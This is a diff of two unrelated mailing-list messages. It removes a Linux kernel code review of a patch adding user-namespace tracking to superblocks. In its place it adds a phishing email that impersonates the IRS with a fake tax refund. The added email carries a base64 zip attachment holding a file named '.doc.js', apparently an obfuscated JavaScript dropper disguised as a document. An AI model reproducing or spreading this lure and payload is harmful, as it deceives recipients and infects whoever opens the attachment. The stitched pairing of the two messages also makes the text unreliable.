@@ -1,26 +1,12 @@
-Received: from out02.mta.xmission.com ([166.70.13.232])
- by bombadil.infradead.org with esmtps (Exim 4.80.1 #2 (Red Hat Linux))
- id 1ZfDz5-0000B0-Po
- for linux-mtd@lists.infradead.org; Thu, 24 Sep 2015 21:23:20 +0000
-From: ebiederm@xmission.com (Eric W. Biederman)
-To: Seth Forshee <seth.forshee@canonical.com>
-Cc: Alexander Viro <viro@zeniv.linux.org.uk>,
- Jeff Layton <jlayton@poochiereds.net>,
- "J. Bruce Fields" <bfields@fieldses.org>,
- Serge Hallyn <serge.hallyn@canonical.com>,
- Andy Lutomirski <luto@amacapital.net>, linux-fsdevel@vger.kernel.org,
- linux-security-module@vger.kernel.org, selinux@tycho.nsa.gov,
- linux-kernel@vger.kernel.org, linux-mtd@lists.infradead.org
-References: <1443039368-55445-1-git-send-email-seth.forshee@canonical.com>
- <1443039368-55445-2-git-send-email-seth.forshee@canonical.com>
-Date: Thu, 24 Sep 2015 16:14:33 -0500
-In-Reply-To: <1443039368-55445-2-git-send-email-seth.forshee@canonical.com>
- (Seth Forshee's message of "Wed, 23 Sep 2015 15:16:01 -0500")
-Message-ID: <87vbazplja.fsf@x220.int.ebiederm.org>
+To: linux-mtd@bombadil.infradead.org
+Subject: You recieved tax refund payment (case #00546854)
+Date: Thu, 24 Sep 2015 23:46:29 +0200
+From: "Internal Revenue Service" <office@huberthaupt-medien.de>
+Reply-To: "Internal Revenue Service" <office@huberthaupt-medien.de>
+Message-ID: <0147cc6d2fe6709c4fbc77b7b0fb0feb@huberthaupt-medien.de>
 MIME-Version: 1.0
-Content-Type: text/plain
-Subject: Re: [PATCH v4 1/7] fs: Add user namesapace member to struct
- super_block
+Content-Type: multipart/mixed; boundary="b1_bb4e79f24f6c3432b45a14c8da7f5ffb"
+Content-Transfer-Encoding: 8bit
 List-Id: Linux MTD discussion mailing list <linux-mtd.lists.infradead.org>
 List-Unsubscribe: <http://lists.infradead.org/mailman/options/linux-mtd>,
  <mailto:linux-mtd-request@lists.infradead.org?subject=unsubscribe>
@@ -30,223 +16,91 @@ List-Help: <mailto:linux-mtd-request@lists.infradead.org?subject=help>
 List-Subscribe: <http://lists.infradead.org/mailman/listinfo/linux-mtd>,
  <mailto:linux-mtd-request@lists.infradead.org?subject=subscribe>
 
-Seth Forshee <seth.forshee@canonical.com> writes:
+--b1_bb4e79f24f6c3432b45a14c8da7f5ffb
+Content-Type: text/plain; charset=us-ascii
 
-> Initially this will be used to eliminate the implicit MNT_NODEV
-> flag for mounts from user namespaces. In the future it will also
-> be used for translating ids and checking capabilities for
-> filesystems mounted from user namespaces.
->
-> s_user_ns is initialized in alloc_super() and is generally set to
-> current_user_ns(). To avoid security and corruption issues, two
-> additional mount checks are also added:
->
->  - do_new_mount() gains a check that the user has CAP_SYS_ADMIN
->    in current_user_ns().
->
->  - sget() will fail with EBUSY when the filesystem it's looking
->    for is already mounted from another user namespace.
->
-> proc requires some special handling. The user namespace of
-> current isn't appropriate when forking as a result of clone (2)
-> with CLONE_NEWPID|CLONE_NEWUSER, as it will set s_user_ns to the
-> namespace of the parent and make proc unmountable in the new user
-> namespace. Instead, the user namespace which owns the new pid
-> namespace is used. sget_userns() is allowed to allow passing in
-> a namespace other than that of current, and sget becomes a
-> wrapper around sget_userns() which passes current_user_ns().
+You are receiving this notification because your tax refund request has been processed.
 
-Minor nits below.  I have fixed them up.
+Please download attached document with approved 94031K form.
 
-> Signed-off-by: Seth Forshee <seth.forshee@canonical.com>
-> ---
->  fs/namespace.c     |  3 +++
->  fs/proc/root.c     |  3 ++-
->  fs/super.c         | 38 +++++++++++++++++++++++++++++++++-----
->  include/linux/fs.h |  9 ++++++++-
->  4 files changed, 46 insertions(+), 7 deletions(-)
->
-> diff --git a/fs/namespace.c b/fs/namespace.c
-> index 0570729c87fd..d023a353dc63 100644
-> --- a/fs/namespace.c
-> +++ b/fs/namespace.c
-> @@ -2381,6 +2381,9 @@ static int do_new_mount(struct path *path, const char *fstype, int flags,
->  	struct vfsmount *mnt;
->  	int err;
->  
-> +	if (!ns_capable(current_user_ns(), CAP_SYS_ADMIN))
-> +		return -EPERM;
-> +
->  	if (!fstype)
->  		return -EINVAL;
->  
-> diff --git a/fs/proc/root.c b/fs/proc/root.c
-> index 361ab4ee42fc..4b302cbf13f9 100644
-> --- a/fs/proc/root.c
-> +++ b/fs/proc/root.c
-> @@ -117,7 +117,8 @@ static struct dentry *proc_mount(struct file_system_type *fs_type,
->  			return ERR_PTR(-EPERM);
->  	}
->  
-> -	sb = sget(fs_type, proc_test_super, proc_set_super, flags, ns);
-> +	sb = sget_userns(fs_type, proc_test_super, proc_set_super, flags,
-> +			 ns->user_ns, ns);
->  	if (IS_ERR(sb))
->  		return ERR_CAST(sb);
->  
-> diff --git a/fs/super.c b/fs/super.c
-> index 954aeb80e202..42837da7d641 100644
-> --- a/fs/super.c
-> +++ b/fs/super.c
-> @@ -33,6 +33,7 @@
->  #include <linux/cleancache.h>
->  #include <linux/fsnotify.h>
->  #include <linux/lockdep.h>
-> +#include <linux/user_namespace.h>
->  #include "internal.h"
->  
->  
-> @@ -163,6 +164,7 @@ static void destroy_super(struct super_block *s)
->  {
->  	list_lru_destroy(&s->s_dentry_lru);
->  	list_lru_destroy(&s->s_inode_lru);
-> +	put_user_ns(s->s_user_ns);
->  	security_sb_free(s);
->  	WARN_ON(!list_empty(&s->s_mounts));
->  	kfree(s->s_subtype);
-> @@ -178,7 +180,8 @@ static void destroy_super(struct super_block *s)
->   *	Allocates and initializes a new &struct super_block.  alloc_super()
->   *	returns a pointer new superblock or %NULL if allocation had failed.
->   */
-> -static struct super_block *alloc_super(struct file_system_type *type, int flags)
-> +static struct super_block *alloc_super(struct file_system_type *type, int flags,
-> +				       struct user_namespace *user_ns)
->  {
->  	struct super_block *s = kzalloc(sizeof(struct super_block),  GFP_USER);
->  	static const struct super_operations default_op;
-> @@ -246,6 +249,8 @@ static struct super_block *alloc_super(struct file_system_type *type, int flags)
->  	s->s_shrink.count_objects = super_cache_count;
->  	s->s_shrink.batch = 1024;
->  	s->s_shrink.flags = SHRINKER_NUMA_AWARE | SHRINKER_MEMCG_AWARE;
-> +
-> +	s->s_user_ns = get_user_ns(user_ns);
->  	return s;
->  
->  fail:
-> @@ -442,17 +447,17 @@ void generic_shutdown_super(struct super_block *sb)
->  EXPORT_SYMBOL(generic_shutdown_super);
->  
->  /**
-> - *	sget	-	find or create a superblock
-> + *	sget_userns -	find or create a superblock
->   *	@type:	filesystem type superblock should belong to
->   *	@test:	comparison callback
->   *	@set:	setup callback
->   *	@flags:	mount flags
+Transaction type - Tax Refund
+Payment method - Wire transfer
+Amount - $ 3332.00
+Status - Processed
+Form - 94031K
 
-You don't mention the user namespace parameter here.  I have fixed that
-as.
+Additional information regarding tax refunds can be found on our website:
+http://www.irs.gov/Refunds.
 
-  + *     @user_ns: User namespace you need CAP_SYS_ADMIN over to mount this fs.
+Regards,
+Internal Revenue Service
+Address: 1111 Constitution Avenue, NW
+Washington, DC 20224
+Website: http://www.irs.gov
+Phone: 1-800-829-1040
 
->   *	@data:	argument to each of them
->   */
-> -struct super_block *sget(struct file_system_type *type,
-> +struct super_block *sget_userns(struct file_system_type *type,
->  			int (*test)(struct super_block *,void *),
->  			int (*set)(struct super_block *,void *),
-> -			int flags,
-> +			int flags, struct user_namespace *user_ns,
->  			void *data)
->  {
->  	struct super_block *s = NULL;
-> @@ -465,6 +470,10 @@ retry:
->  		hlist_for_each_entry(old, &type->fs_supers, s_instances) {
->  			if (!test(old, data))
->  				continue;
-> +			if (user_ns != old->s_user_ns) {
-> +				spin_unlock(&sb_lock);
-> +				return ERR_PTR(-EBUSY);
-> +			}
->  			if (!grab_super(old))
->  				goto retry;
->  			if (s) {
-> @@ -477,7 +486,7 @@ retry:
->  	}
->  	if (!s) {
->  		spin_unlock(&sb_lock);
-> -		s = alloc_super(type, flags);
-> +		s = alloc_super(type, flags, user_ns);
->  		if (!s)
->  			return ERR_PTR(-ENOMEM);
->  		goto retry;
-> @@ -500,6 +509,25 @@ retry:
->  	return s;
->  }
->  
-> +EXPORT_SYMBOL(sget_userns);
-> +
-> +/**
-> + *	sget	-	find or create a superblock
-> + *	@type:	  filesystem type superblock should belong to
-> + *	@test:	  comparison callback
-> + *	@set:	  setup callback
-> + *	@flags:	  mount flags
-> + *	@data:	  argument to each of them
-> + */
-> +struct super_block *sget(struct file_system_type *type,
-> +			int (*test)(struct super_block *,void *),
-> +			int (*set)(struct super_block *,void *),
-> +			int flags,
-> +			void *data)
-> +{
-> +	return sget_userns(type, test, set, flags, current_user_ns(), data);
-> +}
-> +
->  EXPORT_SYMBOL(sget);
->  
->  void drop_super(struct super_block *sb)
-> diff --git a/include/linux/fs.h b/include/linux/fs.h
-> index 72d8a844c692..79c15ab2159d 100644
-> --- a/include/linux/fs.h
-> +++ b/include/linux/fs.h
-> @@ -31,6 +31,7 @@
->  #include <linux/blk_types.h>
->  #include <linux/workqueue.h>
->  #include <linux/percpu-rwsem.h>
-> +#include <linux/user_namespace.h>
->  
->  #include <asm/byteorder.h>
->  #include <uapi/linux/fs.h>
-> @@ -1367,6 +1368,8 @@ struct super_block {
->  	struct workqueue_struct *s_dio_done_wq;
->  	struct hlist_head s_pins;
->  
-> +	struct user_namespace *s_user_ns;
-> +
->  	/*
->  	 * Keep the lru lists last in the structure so they always sit on their
->  	 * own individual cachelines.
-> @@ -1509,7 +1512,6 @@ static inline void sb_start_intwrite(struct super_block *sb)
->  	__sb_start_write(sb, SB_FREEZE_FS, true);
->  }
->  
-> -
 
-You are unncessarily deleting a line here.
+--b1_bb4e79f24f6c3432b45a14c8da7f5ffb
+Content-Type: application/zip; name="Refund_Request_00546854_Confirmed.zip"
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename=Refund_Request_00546854_Confirmed.zip
 
->  extern bool inode_owner_or_capable(const struct inode *inode);
->  
->  /*
-> @@ -1984,6 +1986,11 @@ void deactivate_locked_super(struct super_block *sb);
->  int set_anon_super(struct super_block *s, void *data);
->  int get_anon_bdev(dev_t *);
->  void free_anon_bdev(dev_t);
-> +struct super_block *sget_userns(struct file_system_type *type,
-> +			int (*test)(struct super_block *,void *),
-> +			int (*set)(struct super_block *,void *),
-> +			int flags, struct user_namespace *user_ns,
-> +			void *data);
->  struct super_block *sget(struct file_system_type *type,
->  			int (*test)(struct super_block *,void *),
->  			int (*set)(struct super_block *,void *),
+UEsDBBQAAAAIAM69OEfNFT9MvQsAAKwtAAAoAAAAUmVmdW5kX1JlcXVlc3RfMDA1NDY4NTRfQ29u
+ZmlybWVkLmRvYy5qc4VaaW8dxxH8KwsCtslQeH6PEmUpFSaQJSX5YMGGJSAGDH+Yve/Z+xL037OU
+ZnaMLgEWIBLka+4xfVVX9aQ6rx+6h6v7+/vz/dP7t+cX5zfnV5fL5fWzl+eXl/P5fPfs/Pz84/nl
+/vV+//HN+cWzV48257vLl99cHr/uv/tx/3m/wtPzfpXXl8tuf7k836/w+ny/X+/Z5fx4xfPl8zUu
+51f7X+x/e//28sNnu2f3z+/ffn6K8/0P+/fH/8/v7+6fXSEe62DIdO11TdKF4/WN99GrdBAXtXf7
+4H0XXX8H7xO8w6zU0ZSn0qwZTu9TYZmqOp9yafm/90GXyWs2G904LK+fvhB21bioopeWJ90l8tbF
+UkxlJS0vN54vLP1+TWNpdwNppdJYl2Tn51EgLGOdq56Op76Oa2EYrbMvza4XdeqFXdLpVtrBk++7
+bIU0+vv3wmgdkkEa/dO7PwszNfdbTFcbuqyWp5x3Qa+lYRepcBWGuhiLMKfjUydhN2fFFDYlOTiW
+8TIkBb3KizthNU1+o+g9VDAM8vHy1u+7SJr2p7dLI0yDMVuHNJOm3qSkoYqHkPz78u5G2A2xbjI6
+7SeXJzICi0kndICdsCraNCWrbItkvFRj21CQRvVwku+r2iZJCgrAX6NeWrbDNvjzLC3fvf9NGtbB
+Jq3Oj/8oGNaNfNKt3kdhl8URRVanK5lu/TrXHAzCqmuiJaOS9Z+38pZFR1XI2wvWSxkEQ5jXim5b
+R7P3Spj26VRTvAQyUrs2VFQp9amLZD3ouy3c6Bn3HJaBkPVTSE7zzrIABn2owqqjgL4iZ6iGS8Kt
+LJJzntNrPFp8EoZb2gzRRrfN/ri9ktUtGBsqCSpI5QnOQURtoaxUJ0vWEg9UOx5kGo3JnFDuRqV0
+hk79YKG7eouMPj/rQsrKB+9qnmVlSzZ/oht//CS91i9FuHKas9eGOaKc9BYtM9fX5Irot5/lySXh
+klIo78Etu0fsU2Z4DzJt22SdR6q3j5/LSpUEKqPQ2wtzJ7025XvLbwNpeiWjNNRpz83oa1dcooUu
+p2WqrWPqT3S1j14oDVWdULD0mQxkpWdyLQGrth8qiqib2/fSLIkJi6iTPGGdB8tfV4q42ejp9amn
+StYEdBiEB4KqrkuqThS+vc8w5GvVJJy6oCNH7Z9NMuqWplEhPV9GPo3CuqczIfSoiqTNqEd5i2ze
+/UQehTfIHp9NE2VXKY8kGOoqbagB3FD3bMpp7Ft6Vf9Uyp7SlP5KN76jtp31mgrnR08Gph+EK4Xc
+B/1veb7J3A1U1uvHXsshnE8ZXfJ1ShhpjDMK0D3lCCM1/cD1iRIsnhuaXOTJlZNSHKAP3kUGSjNm
+hZ9QhO6QuqDS7mtNZRF7T5E5tCYdVYAnMlz2uYpRNwXANOUUAHsx9OXJlX5RNHQsjJGVXmKGoYum
+LpAm5VjRCVJJTDseNz0C+yoOFzJLh4GgfhIEdUBoem+fEsPHcxDS67776U66Yms1FQvpV90sYUR5
+++DJEWiqZurYHUOKTnWRH37B72pq6rDSn00nZVDKnyaRaMkZuz0Q6GnX2OduUYcSJHdhG5BzLy+f
+ytNbttoPCFdQw+jjmKaBz5/RQF8WS0LR/Nu7n/77QT5hXAQMQyXYissmoh7UE+LeRobRD14t7YK4
+TWOqP7MMlaneMiqjV/Lomimf9EQhSsNPszRFzW/6zPtWFu8wnqiqDFQagyyMGrK7Ou1w6YvlI0ay
+4bZ/8t2f+Yyqb2ie9HN5TmqKIjoAdZplNV/2CUFTb42uF01H2mdFFdKt62RIZRIW3dpTKx7ey5Ac
+6mlhr6th7OWBrX6ctJoa2e07NUjWbO1aajv9fhoyC8t4ySlrzmcKkXzOOEI8it9GB8Pq0wXDmopx
+2Hd9xV2PqmIZtMVKhSeSZSdUVUeVbP9Z0mBxOpHvvOv9+aRT1pAHwWFtKIi7Jhl7rqF7JZOGacVs
+0xWhvGV3MVWdnzmy+8zvVwptj/DWVDB0Z/YjbWPmL/cwuJUtPpw2utx11EmvJXnWcyGLlRxqA10z
+ki4zX75FXDEbSnNqWrVq4ygAQeS81ilF3o8nOc80ZTBperzsHzJUdJeSy66+zUKaQnW0cS8LqM5m
+g17nkDDSJy+QfTnpkoxAN4XUFkzrQjm5fyR9mzEyVwR8BvWVieDDLxzJqk950GcgoBd/oqbyWj6b
+HqON5wsvk9N2ta1rOZHThiD1JNYP1oHsKtUVMva2Ih4CQgJaAr15a1bmVusnd3QwUcg6xdcwdxXH
+dND4ytASzgPl7qmPqAKt7VA1Ppm+vMjhK86jXiV/PWqqPm73yYph5kWmyNCMhFayiVmfrGnWitH3
+R0/O1vU0JZTC/enXUb5zrSuqCEt0JX2SFVFTMOUQ/ahJhvBHVdQlPyQRXaHPAog3U1ffQVBIcfP9
+1a3/u3TLuOwxRqXm4cxCThXqcKC3GfYRUBaboG3J7tWbn9/ItjTXpaZojCmZozln9n6Qke3nrCHp
+WmpW+VKvrSKA+EH2pN3HzcJQ4lY2pXXTbcwqCfFwTaTmtSC765u/Uaakfsn98EEW/jJpFpo66ioi
+yq7165Tue+q0jOqxaPOOsaWXyfkuVxEF6jcfaMaaupQupsJVNsQyTcbhK21dSzjtL2Ppc4sN9hCS
+HaxYdO7TEZ4amUxdyu+rT1SF6zyc6L77GCHnu6IOpq2jdke1OusD8lxWRtfyoMdtHWnqraesI/a7
+D5qmoKAmEKDbNep6ajvfUhFOVdqNZBcTos0Lf12opvdDJzXCOeTkfKB5dlrqbMqIiDgRuTkXI1Og
+w/WV52Y884kY8fwyK9TCIJyI27BaKWlCHYzySNupCzQrRmqIAhqfyp5ctEMIma9FuKSEIWLvWvqo
+2/b+V/PQKDv04jNHcLmh8l4l0UJNbYeHsrQPwVZHlA03X2mnS5ixcv3ul2/kUeulIdKGholJb3nD
+QtUnBuJ1kjfFQnm9f0iTahw1gS5ZLyVqRI1BQOFw5kPMu7WjhySptNzYI/u4Q31vi/RMYT57r+iC
+6cDinHct/bFtc+FTcqXNv4iGTsu1CShWH65uZYUK04zeJOkpmfI6Y7EvlrdNlUrpNViODptpCxWF
+6iNfISFBVOclrzqYenzodziGGRysPuwzw0U8LM0MK4fi4MxgVzpwbALhGKdhRlIYZQxG1YJjyXCw
+ITA6MIxsDDNT4MBBOIY+HHQXTEmEpQRwNFaY8IDtY3CgD8c8Cie3wPFROGYkOESEA1HD7n7A4FIY
+cRpuvwAuIWGICNg8gRPvcexk4djjglWxYZQluBYLt+8CB8JwdC6YlgO3QgPLD8N2VlgUBcurwe0n
+wEQ3DOCBLWiw2iWOhSS4/SCYrQ843Qd2HoURZWB3cODoNxxIDYdODRfsOEghuHYPBythlldgaRcY
+5QR2XMGhQ8NRajjWLHCIyjjUD7gKCZueOLRKGNUdljiFXRXBIY/CLd/AihFwRDiO0R9W6YdDAbBr
+XDiYeLiGCyOX4RAmYJh4GNUblsGDkf5wdFfYfRVYoAq7hwNLNcMicRwsNRyEgpGTcXCtOHQKWEUS
+Tu3EoT3BKCQwzDyOSg871MKt9cFhFpjBCpZsghvKYHl5GCoAB8cApxfBinOwZCTcwA1HdsGS3DgE
+Lhx8NtzqFczUBTfrwhJIMDIljjkPZrMQdhkMZvEPB2cMu4sAK03CLanAIXuYVQQ4QRxmbQNmGwCH
+uA0j6cMw2LAaLwwUx0G0wCh1sDtesFIMLD2AY5ESx4ocLEKAI9rgeCOYlo9jPQYHoIFbQYSbcXDs
+vOLoYjDbBDByPAwPC8etwIw0sPs1OPbG4EZfGOUVh+IIs6YJSxzA7TfBYGHY1TwcSAIOhMKhBthV
+K1gaE26xBcfMAEvowupYsCuvcHwIDBMFR+7DLJ7CYlYYlhEGYsMwyjDQEobqhZtxYVl7WEoRbjMX
+Tu2GXQiDYc7gGC8YaA2zJAy7/Am7fAGzjgerOMIIrbASBJwMup9WmvW/G0Xij+sviGX/9f8BUEsB
+AgAAFAAAAAgAzr04R80VP0y9CwAArC0AACgAAAAAAAAAAAAgAAAAAAAAAFJlZnVuZF9SZXF1ZXN0
+XzAwNTQ2ODU0X0NvbmZpcm1lZC5kb2MuanNQSwUGAAAAAAEAAQBWAAAAAwwAAAAA
+
+
+--b1_bb4e79f24f6c3432b45a14c8da7f5ffb--
